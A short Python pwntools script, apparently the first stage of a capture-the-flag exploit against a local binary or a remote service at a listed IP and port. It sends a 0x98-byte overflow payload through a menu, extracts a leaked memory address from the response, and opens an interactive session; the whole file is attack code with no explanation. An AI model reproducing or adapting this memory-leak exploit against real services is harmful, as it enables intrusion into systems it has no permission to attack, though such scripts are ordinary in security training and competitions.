from pwn import *

DEBUG = True
if DEBUG:
    p = process(['./prob'])
else:
    p = remote('158.247.199.6', 3333)
context.log_level = 'debug'

payload = 'A' * 0x98
p.sendlineafter("> ", "1")
p.sendafter("> ", payload)

leak = p.recvline()
print(hex(u64(leak[0x98:0x9e]+'\00'+'\00')))

p.interactive()